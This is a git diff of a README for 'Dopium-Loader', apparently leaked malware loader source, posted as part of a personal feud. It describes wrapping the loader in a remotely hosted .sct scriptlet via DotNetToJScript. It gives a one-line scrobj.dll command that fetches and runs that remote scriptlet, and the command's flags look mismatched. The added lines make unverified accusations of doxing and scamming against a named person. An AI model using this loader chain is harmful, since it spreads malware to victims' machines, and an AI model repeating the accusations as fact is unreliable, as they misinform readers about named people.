@@ -1,5 +1,5 @@
 # Dopium-Loader
-Jakob has been harassing me all week so just releasing his goofy loaders source 🤡
+Jakob has been harassing me all week and started leaking my stuff so just releasing his goofy loaders source 🤡
 
 ## How it works:
 Basically this dumbass just used DotNetToJScript to convert his ass loader into a .JS file. eventually i embedded it into a .sct scriptlet and hosted it.
@@ -16,4 +16,4 @@ this will generate the script for it. i have also included the .SCT files in rel
 rundll32 /s /I:<link> scrobj.dll
 ```
 
-enjoy.
+Keep in mind these fellas are untrustworthy. ive also attached screenshots showing them attempting to dox other providers and confessing to scamming. enjoy.
